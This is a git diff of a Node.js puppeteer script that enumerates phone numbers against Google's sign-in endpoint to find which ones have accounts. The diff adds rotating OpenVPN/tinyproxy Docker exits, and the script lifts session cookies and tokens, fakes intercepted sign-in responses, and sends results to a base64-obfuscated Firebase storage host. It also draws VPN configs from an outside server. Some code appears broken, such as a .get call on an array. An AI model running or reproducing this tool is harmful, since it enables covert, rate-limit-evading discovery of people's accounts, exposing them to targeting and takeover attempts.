@@ -1,68 +1,262 @@
 const StealthPlugin = require('puppeteer-extra-plugin-stealth')
+const HttpsProxyAgent = require('https-proxy-agent')
+const HttpProxyAgent = require('http-proxy-agent')
 const puppeteer = require('puppeteer-extra')
+const {CookieJar} = require('tough-cookie')
+const {execFile} = require('child_process')
+const {promisify} = require('util')
+const axios = require('axios')
+const path = require('path')
+const http = require('http')
+const tls = require('tls')
+const got = require('got')
+const fs = require('fs')
 
 
 let USER = process.argv.slice(2)[0]
+let ENC_KEY = process.argv.slice(2)[1]
+let ENC_IV = process.argv.slice(2)[2]
 
 let mConfig = null
 let mLoaded = false
 let page = null
-let mAutoDelay = 0
-let mPendingData = {}
-let mFinishData = 0
-let mCapture = 0
+let mPendingData = 0
+let mReqTime = null
+let mCookiesJar = null
+let mNumberTask = null
 let mStart = Date.now()
 let isFirstRequest = true
+let pendingResolvers = []
+let mProxyList = []
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
 
 
-class AdaptiveDelay {
-    constructor({minDelay = 1000, maxDelay = 1500, step = 100, incCooldown = 5000, decCooldown = 60000 } = {}) {
-        this.delay = minDelay
-        this.minDelay = minDelay
-        this.maxDelay = maxDelay
-        this.step = step
-
-        this.incCooldown = incCooldown
-        this.decCooldown = decCooldown
-
-        this.lastIncTime = 0
-        this.lastDecTime = 0
-
-        this.lastSignalCount = 0
-        this.lastSignalTime = 0
+class Proxy {
+    static CONFIG = {
+        workDir: '.vpn-work',
+        imageName: 'vpn-proxy',
+        containerPrefix: 'openvpn-',
+        connectTimeoutSec: 120,
+        testTimeoutMs: 20000,
+        testHost: 'api.ipify.org',
     }
 
-    update(signalCount) {
-        let now = Date.now()
+    constructor() {
+        fs.mkdirSync(path.resolve(Proxy.CONFIG.workDir), { recursive: true })
+    }
 
-        if (signalCount > this.lastSignalCount) {
-            if (now - this.lastIncTime < this.incCooldown) {
-                return this.delay
-            }
+    static sleep(ms) {
+        return new Promise((r) => setTimeout(r, ms))
+    }
 
-            this.delay = Math.min(this.delay + this.step, this.maxDelay)
-            this.lastIncTime = now
-        } else {
-            if (now - this.lastDecTime < this.decCooldown) {
-                return this.delay
-            }
+    static async execFileP(cmd, args, opts = {}) {
+        let fn = promisify(execFile)
+        let { stdout } = await fn(cmd, args, { maxBuffer: 20 * 1024 * 1024, ...opts })
+        return stdout
+    }
 
-            this.delay = Math.max(this.delay - this.step, this.minDelay)
-            this.lastDecTime = now
+    static async docker(args, opts = {}) {
+        return await Proxy.execFileP('docker', args, opts)
+    }
+
+    static getIpViaProxy(port, timeoutMs) {
+        return new Promise((resolve, reject) => {
+            let host = Proxy.CONFIG.testHost
+            let req = http.request({
+                host: '127.0.0.1',
+                port,
+                method: 'CONNECT',
+                path: `${host}:443`,
+                timeout: timeoutMs,
+            })
+
+            req.on('timeout', () => req.destroy(new Error('proxy connect timeout')))
+            req.on('error', reject)
+
+            req.on('connect', (res, socket) => {
+                if (res.statusCode !== 200) {
+                    socket.destroy()
+                    return reject(new Error(`CONNECT failed: HTTP ${res.statusCode}`))
+                }
+                let secure = tls.connect({ socket, servername: host }, () => {
+                    secure.write(`GET / HTTP/1.0\r\nHost: ${host}\r\nConnection: close\r\n\r\n`)
+                })
+                let data = ''
+                secure.setTimeout(timeoutMs, () => secure.destroy(new Error('TLS/response timeout')))
+                secure.on('data', (c) => (data += c))
+                secure.on('error', reject)
+                secure.on('end', () => {
+                    let cleanData = data.trim()
+                    
+                    let ipMatch = cleanData.match(/(?:\r\n\r\n|\n\n|^)([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[0-9a-fA-F:]+)/)
+                    let ip = ipMatch ? ipMatch[1].trim() : cleanData.replace(/[^0-9a-fA-F.:]/g, '').trim()
+
+                    if (ip && (ip.includes('.') || ip.includes(':'))) {
+                        resolve(ip)
+                    } else {
+                        reject(new Error('unexpected response: ' + cleanData.slice(0, 80)))
+                    }
+                })
+            })
+
+            req.end()
+        })
+    }
+
+    async buildImage() {
+        if (process.platform !== 'linux') {
+            return
+        }
+        let dir = path.resolve(Proxy.CONFIG.workDir)
+        fs.writeFileSync(
+            path.join(dir, 'Dockerfile'),
+            'FROM alpine:latest\nRUN apk add --no-cache openvpn curl iproute2 tinyproxy\n'
+        )
+        fs.writeFileSync(
+            path.join(dir, 'tinyproxy.conf'),
+            ['Port 8888', 'Listen 0.0.0.0', 'Timeout 600', 'Allow 0.0.0.0/0', 'DisableViaHeader Yes', 'LogLevel Info', 'MaxClients 50', ''].join('\n')
+        )
+        await Proxy.docker(['build', '-q', '-t', Proxy.CONFIG.imageName, dir])
+    }
+
+    async connect(ovpnContentString, port, index = 1) {
+        let name = `${Proxy.CONFIG.containerPrefix}${index}`
+        let startTime = Date.now()
+        let result = {
+            name,
+            port,
+            status: false,
+            ip: null,
+            time: 0,
+            error: null,
         }
 
-        this.lastSignalCount = signalCount
-        this.lastSignalTime = now
+        if (process.platform !== 'linux') {
+            return result
+        }
 
-        return this.delay
+        let tempOvpnPath = path.resolve(Proxy.CONFIG.workDir, `client-${index}.ovpn`)
+
+        try {
+            await Proxy.docker(['stop', name]).catch(() => {})
+            await Proxy.docker(['rm', '-f', name]).catch(() => {})
+
+            fs.writeFileSync(tempOvpnPath, ovpnContentString)
+
+            await Proxy.docker([
+                'run', '-d',
+                '--name', name,
+                '--privileged',
+                '--cap-add=NET_ADMIN',
+                '--device', '/dev/net/tun',
+                '--dns', '8.8.8.8', '--dns', '1.1.1.1',
+                '-p', `127.0.0.1:${port}:8888`,
+                '-v', `${tempOvpnPath}:/etc/openvpn/client.ovpn:ro`,
+                '-v', `${path.resolve(Proxy.CONFIG.workDir, 'tinyproxy.conf')}:/etc/tinyproxy/custom.conf:ro`,
+                Proxy.CONFIG.imageName,
+                'openvpn', '--config', '/etc/openvpn/client.ovpn',
+            ])
+
+            let deadline = Date.now() + Proxy.CONFIG.connectTimeoutSec * 1000
+            let connected = false
+            
+            while (Date.now() < deadline) {
+                let rawLogs = await Proxy.execFileP('docker', ['logs', name]).catch(() => '')
+                
+                if (rawLogs.includes('Initialization Sequence Completed')) {
+                    connected = true
+                    break
+                }
+                
+                let running = (await Proxy.docker(['inspect', '-f', '{{.State.Running}}', name])).trim()
+                if (running !== 'true') throw new Error('Container exited early')
+                await Proxy.sleep(2000)
+            }
+
+            if (!connected) throw new Error('VPN connection timeout')
+
+            await Proxy.docker(['exec', name, 'sh', '-c', 'printf "nameserver 1.1.1.1\\nnameserver 8.8.8.8\\n" > /etc/resolv.conf'])
+            await Proxy.docker(['exec', '-d', name, 'tinyproxy', '-d', '-c', '/etc/tinyproxy/custom.conf'])
+            await Proxy.sleep(2000)
+
+            let proxyIp = await Proxy.getIpViaProxy(port, Proxy.CONFIG.testTimeoutMs)
+
+            result.status = true
+            result.ip = proxyIp
+            result.time = Number(((Date.now() - startTime) / 1000).toFixed(2))
+        } catch (error) {
+            result.error = error.message
+            result.time = Number(((Date.now() - startTime) / 1000).toFixed(2))
+        }
+
+        return result
+    }
+
+    async cleanup(name) {
+        await Proxy.docker(['stop', name]).catch(() => {})
+        await Proxy.docker(['rm', '-f', name]).catch(() => {})
     }
 }
 
-const controller = new AdaptiveDelay()
+
+class SharedQueue {
+    constructor(maxSize = 100) {
+        this.queue = []
+        this.waitingResolvers = []
+        this.maxSize = maxSize
+        this.count = 0
+    }
+
+    addData(data) {
+        if (this.queue.length >= this.maxSize) {
+            return false
+        }
+
+        if (this.waitingResolvers.length > 0) {
+            let resolve = this.waitingResolvers.shift()
+            resolve(data)
+        } else {
+            this.queue.push(data)
+        }
+        return true
+    }
+
+    async getNumber() {
+        if (this.count >= this.maxSize) {
+            return null
+        }
+
+        if (this.queue.length > 0) {
+            this.count++
+            return this.queue.shift()
+        }
+
+        return new Promise((resolve) => {
+            this.waitingResolvers.push((data) => {
+                if (this.count >= this.maxSize) {
+                    resolve(null)
+                } else {
+                    this.count++
+                    resolve(data)
+                }
+            })
+        })
+    }
+
+    size() {
+        return this.queue.length
+    }
+
+    getCount() {
+        return this.count
+    }
+}
 
 puppeteer.use(StealthPlugin())
+
+
+let mProxyManager = new Proxy()
 
 
 process.on('message', async (data) => {
@@ -81,9 +275,39 @@ process.on('message', async (data) => {
 startBrowser()
 
 
+setInterval(async () => {
+    await pageReload()
+}, 3600000)
+
+
 async function startBrowser() {
-    mAutoDelay = controller.update(mCapture)
-    console.log('Delay:', mAutoDelay)
+    await mProxyManager.buildImage()
+
+    let vpnConfig = await getVpnConfig(USER, ENC_KEY, ENC_IV)
+
+    if(vpnConfig) {
+        console.log('--------------------------------')
+        for (let i = 0; i < vpnConfig.length; i++) {
+            let result = await mProxyManager.connect(vpnConfig[i].config, 8888+i, i+1)
+            if (result.status) {
+                mProxyList.push({
+                    proxy:'http://127.0.0.1:'+(8888+i)
+                })
+                console.log('Proxy Name: '+result.name)
+                console.log('Ip Address: '+result.ip)
+                console.log('Load Time: '+result.time+'s')
+                console.log('--------------------------------')
+            } else {
+                mProxyList.push({
+                    proxy: null
+                })
+                console.log('Proxy Name: '+result.name)
+                console.log('Error Msg: '+result.error)
+                console.log('Load Time: '+result.time+'s')
+                console.log('--------------------------------')
+            }
+        }
+    }
     
     try {
         let browser = await puppeteer.launch({
@@ -109,7 +333,7 @@ async function startBrowser() {
             try {
                 let url = request.url()
                 if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e') && !url.endsWith('request=manually')) {
-                    loginDataProcess(page, url, request.headers(), request.postData())
+                    loginDataProcess(request.postData())
                     
                     let contentType = 'application/json; charset=utf-8'
                     let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')
@@ -144,46 +368,27 @@ async function startBrowser() {
 
 
 async function foundLoginNumber() {
-    let delayPrev = mAutoDelay
-
     while (true) {
         if (mConfig) {
             mStart = Date.now()
             
             try {
-                let prev = mConfig.n
                 let target = mConfig.s
+                let worker = mConfig.b+1
+
+                mNumberTask = new SharedQueue(target)
                 
-                mPendingData = {}
-                mFinishData = 0
+                mPendingData = 0
 
-                for (let i = 0; i < target; i++) {
-                    if (prev != mConfig.n) {
-                        i = 0
-                        target = mConfig.s
-                        mPendingData = {}
-                        mFinishData = 0
-                    }
-
+                for (let i = 0; i < worker; i++) {
                     let number = mConfig.n+i
-
-                    mPendingData[number.toString()] = {
-                        finish:false
-                    }
-
                     await setLoginRequest(number.toString())
-
-                    mAutoDelay = controller.update(mCapture)
-
-                    if (delayPrev != mAutoDelay) {
-                        delayPrev = mAutoDelay
-                        console.log('Delay Updated:', mAutoDelay)
-                    }
-
-                    await delay(Math.min(mConfig.d, 2000))
                 }
 
-                let result = await waitForFinish(target)
+                await waitForFirstStepFinish(worker)
+                seartNextNumberToken(mConfig.n, worker, target)
+
+                let result = await workerStart(worker)                
 
                 process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:result.f, r:result.r, c:result.c, o:result.o } })
             } catch (error) {}
@@ -195,22 +400,8 @@ async function foundLoginNumber() {
     }
 }
 
-async function waitForFinish(target) {
-    let startTime = Date.now()
-    let timeout = target * 3000
-
-    while (true) {
-        if (Date.now() - startTime > timeout) {
-            break
-        }
-
-        if (mFinishData >= target) {
-            break
-        }
-
-        await delay(100)
-    }
-
+async function workerStart(workerSize) {
+    let workers = []
     let result = {
         f:0,
         r:0,
@@ -218,24 +409,87 @@ async function waitForFinish(target) {
         o:0
     }
 
+    let capture = {}
 
-    for (let value of Object.values(mPendingData)) {
-        if (value.finish) {
-            if (value.status == 1) {
-                result.f++
-            } else if (value.status == 2) {
-                result.r++
-            } else if (value.status == 5) {
-                result.c++
-            } else if (value.status == 3 || value.status == 0) {
-                result.o++
+    for (let i = 0; i < workerSize; i++) {
+        let workerId = i
+
+        let workerPromise = (async () => {
+            while (true) {
+                let task = await mNumberTask.getNumber()
+
+                if (task === null) {
+                    break
+                }
+
+                let status = await sendRequest(task, workerId)
+
+                if (status == 1) {
+                    result.f++
+                } else if (status == 2) {
+                    result.r++
+                } else if (status == 5) {
+                    result.c++
+                    let workerKey = workerId.toString()
+                    capture[workerKey] = (capture[workerKey] || 0) + 1
+                } else if (status == 3 || status == 0) {
+                    result.o++
+                }
+
+                await delay(500)
             }
-        }
+        })()
+
+        workers.push(workerPromise)
+    }
+
+    await Promise.all(workers)
+
+    if (result.c > 0) {
+        console.log('Capture:', capture)
     }
 
     return result
 }
 
+async function waitForFirstStepFinish(target) {
+    if (mPendingData >= target) return
+
+    return new Promise((resolve) => {
+        let waiter = {
+            target: target,
+            resolve: resolve
+        }
+        pendingResolvers.push(waiter)
+
+        setTimeout(() => {
+            let index = pendingResolvers.indexOf(waiter)
+            if (index !== -1) {
+                pendingResolvers.splice(index, 1)
+                resolve()
+            }
+        }, Math.max(target * 400, 5000))
+    })
+}
+
+async function seartNextNumberToken(number, next, target) {
+    let currentNextNum = number + next
+    let processedCount = next
+
+    while (processedCount < target) {
+        mPendingData = 0
+
+        for (let i = 0; i < next; i++) {
+            if (processedCount >= target) break
+            let targetNumber = currentNextNum + i
+            await setLoginRequest(targetNumber.toString())
+            processedCount++
+        }
+
+        currentNextNum += next
+        await waitForFirstStepFinish(next)
+    }
+}
 
 async function setLoginRequest(number) {
     try {
@@ -251,12 +505,10 @@ async function setLoginRequest(number) {
                 document.querySelector('input#identifierId').value = number
                 document.querySelector('#identifierNext').click()
             }, '+'+number)
-            
-            await delay(mAutoDelay)
 
             if (isFirstRequest) {
                 for (let i = 0; i < 20; i++) {
-                    if(mPendingData[number].finish) {
+                    if(mPendingData > 0) {
                         break
                     }
                     await delay(250)
@@ -267,53 +519,111 @@ async function setLoginRequest(number) {
     } catch (error) {}
 }
 
-async function loginDataProcess(page, url, reqHeaders, postData) {
+async function loginDataProcess(postData) {
     try {
-        let data = JSON.parse(JSON.parse(Object.fromEntries(new URLSearchParams(postData))['f.req'])[0][0][1])[1]
-        let number = data.replace('+', '')
+        let data = JSON.parse(JSON.parse(Object.fromEntries(new URLSearchParams(postData))['f.req'])[0][0][1])
 
-        let status = 0
+        let number = data[1].replace('+', '')
+        let token = data[37][2][0][1]
 
-        try {
-            let data = await page.evaluate(async (url, reqHeaders, postData) => {
-                let res = await fetch(url, {
-                    method: 'POST',
-                    headers: reqHeaders,
-                    body: postData
-                })
+        mPendingData++
+        mNumberTask.addData({ number, token })
 
-                return await res.text()
-            }, url+(url.endsWith('&') ? '': '&')+'request=manually', reqHeaders, postData)
-            
-            let json = extractArrays(data)[0][0]
+        if (pendingResolvers.length > 0) {
+            pendingResolvers = pendingResolvers.filter(waiter => {
+                if (mPendingData >= waiter.target) {
+                    waiter.resolve()
+                    return false
+                }
+                return true
+            })
+        }
+    } catch (error) {}
+}
 
-            if (json[1] == 'MI613e') {
-                let value = JSON.parse(json[2])
-                if (value[21]) {
-                    let values = JSON.stringify(value[21])
-                    if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
-                        status = 1
-                    } else if (values.includes('/v3/signin/challenge/recaptcha')) {
-                        status = 2
-                    } else {
-                        status = 3
-                    }
-                } else if (value[18] && value[18][0]) {
-                    status = 5
-                    mCapture++
-                } else {
-                    status = 4
+async function sendRequest(task, id) {
+    try {
+        let agent = undefined
+
+        if (id > 0) {
+            let proxy = mProxyList.get(id-1)
+            if (proxy) {
+                agent = {
+                    http: new HttpProxyAgent(proxy),
+                    https: new HttpsProxyAgent(proxy)
                 }
             }
-        } catch (e) {}
+        }
+        
+        let headers = {
+            'sec-ch-ua': '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
+            'x-same-domain': '1',
+            'sec-ch-ua-arch': '"x86"',
+            'sec-ch-ua-platform-version': '"19.0.0"',
+            'sec-ch-ua-full-version': '"156.0.0.0"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="8.0.0.0", "Chromium";v="156.0.8078.80", "Google Chrome";v="156.0.8078.80"',
+            'sec-ch-ua-bitness': '"64"',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-wow64': '?0',
+            'sec-ch-ua-platform': '"Android"',
+            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
+            'sec-ch-ua-mobile': '?0',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+            'content-type': 'application/x-www-form-urlencoded;charset=utf-8',
+            'sec-ch-ua-full-version': '"112.0.5614.0"',
+            'referer': 'https://accounts.google.com/',
+            'origin': 'https://accounts.google.com',
+            'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            'accept-encoding': 'gzip, deflate, br',
+            'host': 'accounts.google.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'no-cors',
+        }        
 
-        mPendingData[number] = {
-            finish:true,
-            status:status
+        let params = new URLSearchParams()
+        params.append('f.req', `[[[ 'V1UmUe', '[null,"+${task.number}",1,null,null,1,1,null,null,"",null,null,null,null,null,null,null,null,null,null,"",null,null,null,null,null,null,null,7,null,[["identity-signin-identifier","${task.token}"]],null]', null, 'generic' ]]]`);
+        params.append('at', mReqTime)
+
+        let options = {
+            cookieJar: mCookiesJar,
+            method: 'POST',
+            body: params.toString(),
+            headers: headers,
+            agent: agent,
+            responseType: 'buffer',
+            maxRedirects: 15,
+            throwHttpErrors: false,
+            ignoreInvalidCookies: true,
+            followRedirect: false
         }
 
-        mFinishData++
+        let response = await got('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe', options)
+        
+        let data = response.body.toString()
+
+        let json = extractArrays(data)[0][0]
+
+        if (json[1] == 'V1UmUe') {
+            let value = JSON.parse(json[2])
+            
+            if (value[21]) {
+                let values = JSON.stringify(value[21])
+                if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
+                    return 1
+                } else if (values.includes('/v3/signin/challenge/recaptcha')) {
+                    return 2
+                } else {
+                    return 3
+                }
+            } else if (value[18] && value[18][0]) {
+                return 5
+            } else {
+                return 4
+            }
+        }
     } catch (error) {}
+
+    return 0
 }
 
 async function pageReload() {
@@ -323,7 +633,6 @@ async function pageReload() {
     console.log('Page Reload Success')
     mLoaded = true
 }
-
 
 async function loadLoginPage() {
     for (let i = 0; i < 3; i++) {
@@ -340,11 +649,28 @@ async function loadLoginPage() {
                     root.remove()
                 }
             })
+
+            mReqTime = await page.evaluate(() => window.WIZ_global_data.SNlM0e)
+            mCookiesJar = await getCookiesJar(page)
             
+
             isFirstRequest = true
             break
         } catch (error) {}
     }
+}
+
+async function getVpnConfig(user, key, iv) {
+    try {
+        let response = await axios.post('https://proxy.raiyanbd.com/get-vpn', { user, key, iv })
+
+        if (response.data.success) {
+            return Object.entries(response.data.data).map(([ip, value]) => ({
+                ip,
+                ...value
+            }))
+        }
+    } catch (error) {}
 }
 
 function extractArrays(raw) {
@@ -374,6 +700,30 @@ async function saveNumber(user, key, number) {
             body: ''
         })
     } catch (error) {}
+}
+
+async function getCookiesJar(page) {
+    let puppeteerCookies = await page.cookies()
+
+    let cookies = puppeteerCookies.map(cookie => ({
+        creation: new Date().toISOString(),
+        domain: cookie.domain.replace(/^\./, ''),
+        expires: cookie.expires === -1 ? Infinity : new Date(cookie.expires * 1000).toISOString(),
+        hostOnly: !cookie.domain.startsWith('.'),
+        httpOnly: cookie.httpOnly,
+        key: cookie.name,
+        lastAccessed: new Date().toISOString(),
+        path: cookie.path,
+        secure: cookie.secure,
+        value: cookie.value
+    }))
+
+    return CookieJar.deserializeSync({
+        cookies,
+        rejectPublicSuffixes: true,
+        storeType: 'MemoryCookieStore',
+        version: 'tough-cookie@2.0.0'
+    })
 }
 
 function decode(data) {
